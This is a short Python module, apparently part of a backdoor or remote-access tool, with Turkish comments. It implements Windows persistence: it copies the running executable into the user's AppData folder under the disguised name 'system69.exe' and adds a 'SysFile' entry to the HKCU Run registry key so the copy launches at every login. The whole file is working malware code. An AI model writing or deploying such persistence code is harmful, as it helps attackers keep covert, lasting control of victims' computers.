import sys
import os
import shutil
import importlib

# windows icin
winreg_exists = importlib.util.find_spec('winreg')
if winreg_exists:
    import winreg


def become_persistent(my_socket):
    print("[+] Ba≈ülangic programlarina Registry eys ekleyerek persistent olma")
    # exe dosyasini baska bir yere aktarmamiz gerekiyor mesela temp gibi
    # veya appdata

    curr_exec = sys.executable

    # appdataya kopyalaniyor
    app_data = os.getenv("APPDATA")
    to_save_file = app_data + "\\"+"system69.exe"

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_exec, to_save_file)

        # sys reg anahtarlarin guncellenmesi
        key = winreg.HKEY_CURRENT_USER

        # "software\Microsoft\Windows\CurrentVersion\Run"

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_object = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_object, "SysFile", 0,
                          winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_object)
